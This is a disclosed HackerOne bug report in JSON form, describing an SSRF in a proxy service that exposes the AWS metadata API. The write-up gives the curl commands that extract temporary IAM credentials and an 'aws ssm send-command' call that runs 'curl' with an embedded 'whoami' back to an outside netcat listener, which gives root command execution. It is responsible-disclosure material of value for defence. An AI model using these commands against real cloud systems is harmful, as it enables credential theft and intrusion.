{
  "id": 401136,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDExMzY=",
  "url": "https://hackerone.com/reports/401136",
  "title": "Remote Code Execution on Proxy Service (as root)",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2017-09-28T17:44:07.000Z",
  "submitted_at": "2017-09-28T17:44:07.000Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "michiel",
    "url": "/michiel",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 31807,
    "url": "https://hackerone.com/redact",
    "handle": "redact",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/031/807/3bf790585f65096b99a75d5fc8e1a8a9ad968da1_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "profile": {
      "name": "██████",
      "twitter_handle": "",
      "website": "",
      "about": "██████ "
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": true,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-08-27T17:48:44.909Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": true,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The proxy service used to provide researchers with access to certain programs on ██████ allows access to AWS's Metadata API. This Metadata API in turn is configured to expose temporary AWS access credentials for the AWS EC2 Run Command role. When this role is assumed by an AWS client (e.g. the CLI), it is possible to execute arbitrary commands on AWS EC2 instances.\n\n## Obtaining the AWS keys\nFirst up we are going to use cURL and to proof the AWS Metadata API is accessible:\n\n```\ncurl -vv http://169.254.169.254/latest/ -x '52.6.██.███:25603'\n```\n\nHere we are instructing cURL to load up AWS's Metadata API through the proxy. Since the proxy is hosted on AWS, and is not blocking traffic to internal IPs such as this API, we are able to gain access to it.\n\nTo generate a temporary pair of access keys, we will run the following command:\n\n```\ncurl -vv http://169.254.169.254/latest/meta-data/iam/security-credentials/runCommand -x '52.6.██.███:25603'\n```\n\nThe `runCommand` role is interesting and made me assume it was used for https://aws.amazon.com/ec2/run-command/.\n\n## Configuring AWS CLI\nYou will need to have the AWS CLI installed before you can continue.\n\nNow set the following environment variables:\n\n```\nexport AWS_ACCESS_KEY_ID=<\"AccessKeyId\" you exposed in the last cURL command>\nexport AWS_SECRET_ACCESS_KEY=<\"SecretAccessKey\" you exposed in the last cURL commandt>\nexport AWS_SESSION_TOKEN=<\"Token\" you exposed in the last cURL command>\n```\n\nNow in the same shell session you should be able to interact with several AWS services through the CLI.\n\n## Executing arbitrary commands as root\nSince the role name was `runCommand` I immediately went for AWS EC2 Systems Manager (specifically `aws ssm send-command`).\n\nWith the access keys configured, I ran the following AWS CLI command to proof the keys indeed did have sufficient permissions to execute arbitrary commands:\n\n```\naws ssm send-command --instance-ids \"i-05b████████adaa\" --document-name \"AWS-RunShellScript\" --comment \"whoami\" --parameters commands='curl 162.243.███.███:8080/`whoami`' --output text --region=us-east-1\n```\n\nOn my dev server I had a netcat listener running on port 8080 (`nc -vvkl 8080`) to capture the incoming cURL request. I also chose to execute a quick `whoami` command and pass it along as the path in the cURL HTTP call so I can quickly confirm what type of user is executing these commands.\n\nThe HTTP request came in as follows:\n\n```\nConnection from [52.73.██.██] port 8080 [tcp/http-alt] accepted (family 2, sport 45163)\nGET /root HTTP/1.1\nUser-Agent: curl/7.35.0\nHost: 162.243.███.███:8080\nAccept: */*\n```\n\nThis was enough proof for me to conclude command execution is possible and these commands are executed as **root**.\n\nNote that I only tried this on one instance, but I am expecting there are more instances in the `us-east-1` region that allow this type of command execution (and potentially instances in other regions as well).",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 80,
  "voters": [
    "barbie_girl",
    "smither",
    "dyuen",
    "dirk",
    "krevetk0",
    "tomdev",
    "thaivu",
    "cdl",
    "mashoud1122",
    "smiegles",
    "and 70 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 10013,
      "category": "researcher",
      "content": "## Introduction\nI discovered this remote code execution (RCE) vulnerability on a proxy service used to track researcher activity. It was an opportunity for me to learn more about AWS, and specifically the dangers of AWS EC2 Systems Manager combined with an open metadata API. \n\n## Impact update\nAfter back and forth with the ██████ team, it became clear the vulnerable instance was hosted in a completely separate AWS account that was only shared with a limited number of identical instances. That makes it very unlikely this vulnerability could have been escalated to other applications such as ██████.com or ████.██████.com.\n\n## Disclosure\nAs a courtesy, I sent this write up to the organization prior to disclosure. Unfortunately, the program explicitly required anonymized disclosure, hence the heavy redaction. Despite the missing context from the disappointing lack of transparency, I hope the community still finds this summary valuable. \n\nEnjoy!",
      "user": {
        "id": 7,
        "username": "michiel",
        "name": "Michiel Prins",
        "bio": "Co-founder of HackerOne",
        "cleared": true,
        "verified": true,
        "website": "https://hackerone.com",
        "location": "San Francisco, CA",
        "created_at": "2013-03-08T01:22:56.332Z",
        "url": "https://hackerone.com/michiel",
        "hackerone_triager": false,
        "hackerone_employee": true,
        "user_type": "company",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/000/007/439427fb81f710e5e16246ede1828613d46bb79e_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
        }
      },
      "can_view?": true,
      "can_create?": false,
      "attachments": []
    }
  ]
}
